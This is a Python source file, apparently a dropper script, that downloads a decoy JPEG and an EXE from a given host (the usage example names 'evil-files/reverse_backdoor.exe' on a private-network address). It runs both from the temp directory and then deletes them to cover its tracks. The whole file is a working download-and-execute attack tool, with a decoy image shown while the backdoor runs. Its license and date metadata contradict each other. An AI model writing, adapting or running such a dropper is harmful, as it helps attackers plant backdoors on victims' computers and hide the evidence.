#!/usr/bin/env python
import argparse
import tempfile
import requests
import subprocess
import os

"""
    Run the script by providing the required arguments in the following format:
    
    Usage:
      ./python file_downloader.py http://192.168.100.210/evil-files/lambo.jpeg http://192.168.100.210/evil-files/reverse_backdoor.exe
      
    The arguments are the URLs of the JPEG and EXE files you want to download, execute, and then remove.
    The script will download the files to the temp directory, execute them, and then remove them.
    
    License:
        MIT License

        Copyright (c) 2023 Marco A. Villarruel

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contact__     = "marco.urquieta@proton.me"
__copyright__   = "Copyright 2013, WildBerry"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__email__       =  "marco.urquieta@proton.me"
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"

def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

def download(url):
    """Download a file from the given URL."""

    # Send a GET request to the URL
    response = requests.get(url)
    # Extract the filename from the URL
    filename = url.split('/')[-1]

    # Open the file in write-binary mode and write the content
    with open(filename, 'wb') as file:
        file.write(response.content)

    # Return the filename for further processing
    return filename


def run_files(jpeg_url, exe_url):
    """Download files, execute them and then remove them."""

    # Change the working directory to the temp directory
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)

    # Download the jpeg file and run it
    jpeg_filename = download(jpeg_url)
    subprocess.Popen(jpeg_filename, shell=True)

    # Download the exe file and run it
    exe_filename = download(exe_url)
    subprocess.call(exe_filename, shell=True)

    # Remove the files
    os.remove(jpeg_filename)
    os.remove(exe_filename)


if __name__ == "__main__":
    logo()
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="File Download and Run Script")
    parser.add_argument("-f", "--jpeg-url", dest="jpeg_url",
                        help="The URL of the JPEG file")
    parser.add_argument("-e", "--exec-url", dest="exe_url",
                        help="The URL of the EXE file")
    args = parser.parse_args()

    # Download, run and remove the files
    run_files(args.jpeg_url, args.exe_url)
